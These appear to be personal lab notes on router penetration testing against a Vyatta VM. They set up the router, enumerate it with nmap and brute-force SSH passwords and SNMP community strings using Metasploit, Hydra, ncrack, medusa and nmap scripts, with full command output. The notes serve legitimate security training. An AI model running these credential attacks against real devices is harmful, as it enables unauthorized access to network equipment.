Router Pentesting

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Software Vulnerabilities
1.) Rare and fixed soon
2.) Exploit Research

Faulty by design
1.) Difficult to find for mature products
2.) Reversing firmware images and testing

Configuration Flaws
1.) Very common
2.) As secure as the team implementing it

List of Configuration Flaws
1.) Attacking admin services
* SSH, Telnet
* HTTPD
* SNMP
2.) Routing Attacks
- RIP
- OSPF
- BGP

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Default Username and Password
vyatta
vyatta

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Installing vyatta
$ install image

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Set IP address for vyatta
$ configure
# set interfaces ethernet eth0 address 192.168.1.101/24
# commit
# save
# show interfaces

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Configure SSH
$ configure
# set service ssh
# commit
# save

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

vyatta@vyatta:~$ show configuration
interfaces {
    ethernet eth0 {
        address 192.168.1.101/24
        duplex auto
        hw-id 00:0c:29:77:a7:10
        smp_affinity auto
        speed auto
    }
    loopback lo {
    }
}
service {
    ssh {
    }
}
system {
    config-management {
        commit-revisions 20
    }
    console {
        device ttyS0 {
            speed 9600
        }
    }
    host-name vyatta
    login {
        user vyatta {
            authentication {
                encrypted-password ****************
            }
            level admin
        }
    }
    ntp {
        server 0.vyatta.pool.ntp.org {
        }
        server 1.vyatta.pool.ntp.org {
        }
        server 2.vyatta.pool.ntp.org {
        }
    }
    package {
        auto-sync 1
        repository community {
            components main
            distribution stable
            password ****************
            url http://packages.vyatta.com/vyatta
            username ""
        }
    }
    syslog {
        global {
            facility all {
                level notice
            }
            facility protocols {
                level debug
            }
        }
    }
    time-zone GMT
}
vyatta@vyatta:~$

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Setup SSH, Telnet, SNMP
$ configure
# set service ssh
# set service telnet
# set service https
# set service snmp
# set service snmp community public
# set service snmp community public authorization ro
# set service snmp community private authorization rw
# commit
# save

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Enumeration

In Kali
1.) TCP Scan
$ nmap -sV -n 192.168.1.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 12:38 EST
Nmap scan report for 192.168.1.101
Host is up (0.00083s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
23/tcp  open  telnet   Vyatta router telnetd 1.14.0 or later
80/tcp  open  http     lighttpd 1.4.28
443/tcp open  ssl/http lighttpd 1.4.28
MAC Address: 00:0C:29:77:A7:10 (VMware)
Service Info: OS: Linux; Device: router; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds

2.) UDP Scan
$ nmap -sU -p 161 -sV -n 192.168.1.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 12:44 EST
Nmap scan report for 192.168.1.101
Host is up (0.00048s latency).
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
MAC Address: 00:0C:29:77:A7:10 (VMware)
Service Info: Host: vyatta

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

SSH
ssh vyatta@192.168.1.101
The authenticity of host '192.168.1.101 (192.168.1.101)' can't be established.
RSA key fingerprint is SHA256:GxLlb4qyM8g2fchXYk0IU1FAic0EUdOI0SRuREweuMw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.101' (RSA) to the list of known hosts.
Welcome to Vyatta
vyatta@192.168.1.101's password:
Linux vyatta 3.3.8-1-586-vyatta #1 SMP Wed Mar 13 10:35:45 PDT 2013 i686
Welcome to Vyatta.
This system is open-source software. The exact distribution terms for
each module comprising the full system are described in the individual
files in /usr/share/doc/*/copyright.
Last login: Tue Feb 28 09:39:40 2017
vyatta@vyatta:~$

Telnet
$ nc 192.168.1.101 23
��������
Welcome to Vyatta
vyatta login: vyatta
vyatta
Password: vyatta

Last login: Tue Feb 28 08:00:01 GMT 2017 from 192.168.1.10 on pts/0
Linux vyatta 3.3.8-1-586-vyatta #1 SMP Wed Mar 13 10:35:45 PDT 2013 i686
Welcome to Vyatta.
This system is open-source software. The exact distribution terms for
each module comprising the full system are described in the individual
files in /usr/share/doc/*/copyright.
vyatta@vyatta:~$ exit
exit
logout

HTTP
In Browser
192.168.1.101

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

SNMP
-sC -> runs nmap scripts
$ nmap -sU -p 161 -sV -sC -n 192.168.1.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 12:45 EST
Nmap scan report for 192.168.1.101
Host is up (0.00047s latency).
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 86d631386037b558
|   snmpEngineBoots: 1
|_  snmpEngineTime: 1h05m43s
| snmp-sysdescr: Vyatta VC6.6R1
|_  System uptime: 1h05m43.38s (394338 timeticks)
MAC Address: 00:0C:29:77:A7:10 (VMware)
Service Info: Host: vyatta

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds

Make SNMP Secure
$ configure
# delete service snmp community public
# set service snmp community public2 authorization ro
# commit
# save

Nmap Scan
$ nmap -sU -p 161 -sV -n -sC 192.168.1.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 12:50 EST
Nmap scan report for 192.168.1.101
Host is up (0.00045s latency).
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 449a1b3ec947b558
|   snmpEngineBoots: 1
|_  snmpEngineTime: 37s
MAC Address: 00:0C:29:77:A7:10 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.76 seconds

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Cracking SSH credentials

In Vyatta
Create SSH user admin with password a2d2
$ configure
# set system login user admin authentication plaintext-password a2d2
# commit
# save

In Kali
Generate wordlist
$ crunch 4 4 ad12 > wordlist
Crunch will now generate the following amount of data: 1280 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 256

Cracking using MSF
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(ssh_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf auxiliary(ssh_login) > set PASS_FILE /root/Desktop/wordlist
PASS_FILE => /root/Desktop/wordlist
msf auxiliary(ssh_login) > set RHOSTS 192.168.1.101
RHOSTS => 192.168.1.101
msf auxiliary(ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(ssh_login) > set USERNAME admin
USERNAME => admin
msf auxiliary(ssh_login) > set THREADS 20
THREADS => 20
msf auxiliary(ssh_login) > run

[*] SSH - Starting bruteforce
[-] SSH - Failed: 'admin:aaaa'
[!] No active DB -- Credential data will not be saved!
[-] SSH - Failed: 'admin:aaad'
[-] SSH - Failed: 'admin:aaa1'
[-] SSH - Failed: 'admin:aaa2'
[-] SSH - Failed: 'admin:aada'
[-] SSH - Failed: 'admin:aadd'
<snip>
[-] SSH - Failed: 'admin:a2a1'
[-] SSH - Failed: 'admin:a2a2'
[-] SSH - Failed: 'admin:a2da'
[-] SSH - Failed: 'admin:a2dd'
[-] SSH - Failed: 'admin:a2d1'
[+] SSH - Success: 'admin:a2d2' 'uid=1001(admin) gid=100(users) groups=100(users),4(adm),6(disk),27(sudo),30(dip),102(quaggavty),104(vyattacfg) Linux vyatta 3.3.8-1-586-vyatta #1 SMP Wed Mar 13 10:35:45 PDT 2013 i686 GNU/Linux '
[*] Command shell session 1 opened (192.168.1.13:46259 -> 192.168.1.101:22) at 2017-02-28 13:09:51 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) >

Crack using Hydra
hydra -l admin -P wordlist 192.168.1.101 ssh
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-28 13:09:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 256 login tries (l:1/p:256), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.1.101   login: admin   password: a2d2
[STATUS] 256.00 tries/min, 256 tries in 00:01h, 1 to do in 00:01h, 16 active
[STATUS] 128.00 tries/min, 256 tries in 00:02h, 1 to do in 00:01h, 16 active

Crack using ncrack
$ ncrack -v -T 5 --user admin -P wordlist 192.168.1.101:22

Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-02-28 13:13 EST

Discovered credentials on ssh://192.168.1.101:22 'admin' 'a2d2'
ssh://192.168.1.101:22 finished.

Discovered credentials for ssh on 192.168.1.101 22/tcp:
192.168.1.101 22/tcp ssh: 'admin' 'a2d2'

Ncrack done: 1 service scanned in 30.01 seconds.
Probes sent: 53 | timed-out: 0 | prematurely-closed: 15

Ncrack finished.

Crack using medusa
$ medusa -d
$ medusa -h 192.168.1.101 -u admin -P wordlist -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaaa (1 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaad (2 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaa1 (3 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaa2 (4 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aada (5 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aadd (6 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aad1 (7 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aad2 (8 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aa1a (9 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aa1d (10 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aa11 (11 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aa12 (12 of 256 complete)
<snip>
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a122 (48 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2aa (49 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2ad (50 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2a1 (51 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2a2 (52 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2da (53 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2dd (54 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2d1 (55 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2d2 (56 of 256 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.101 User: admin Password: a2d2 [SUCCESS]

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Attacking SNMP

Setup Vyatta
$ configure
# set service snmp community a1d2 authorization ro
# delete service snmp community public2
# delete service snmp community private
# commit
# save

Using nmap
$ nmap -sU -p 161 --script snmp-brute 192.168.1.101 --script-args=snmp-brute.communitiesdb=wordlist

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 13:40 EST
Nmap scan report for 192.168.1.101
Host is up (0.00047s latency).
PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute:
|_  a1d2 - Valid credentials
MAC Address: 00:0C:29:77:A7:10 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds

Using MSF
msf > use auxiliary/scanner/snmp/snmp_login
msf auxiliary(snmp_login) > show options

Module options (auxiliary/scanner/snmp/snmp_login):

   Name              Current Setting                                                       Required  Description
   ----              ---------------                                                       --------  -----------
   BLANK_PASSWORDS   false                                                                 no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                     yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                 no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                 no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                 no        Add all users in the current database to the list
   PASSWORD                                                                                no        The password to test
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt  no        File containing communities, one per line
   RHOSTS                                                                                  yes       The target address range or CIDR identifier
   RPORT             161                                                                   yes       The target port
   STOP_ON_SUCCESS   false                                                                 yes       Stop guessing when a credential works for a host
   THREADS           1                                                                     yes       The number of concurrent threads
   USER_AS_PASS      false                                                                 no        Try the username as the password for all users
   VERBOSE           true                                                                  yes       Whether to print output for all attempts
   VERSION           1                                                                     yes       The SNMP version to scan (Accepted: 1, 2c, all)

msf auxiliary(snmp_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf auxiliary(snmp_login) > set PASS_FILE /root/Desktop/wordlist
PASS_FILE => /root/Desktop/wordlist
msf auxiliary(snmp_login) > set RHOSTS 192.168.1.101
RHOSTS => 192.168.1.101
msf auxiliary(snmp_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(snmp_login) > set THREADS 20
THREADS => 20
msf auxiliary(snmp_login) > run

[!] No active DB -- Credential data will not be saved!
[+] 192.168.1.101:161 - LOGIN SUCCESSFUL: a1d2 (Access level: read-only); Proof (sysDescr.0): Vyatta VC6.6R1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(snmp_login) >
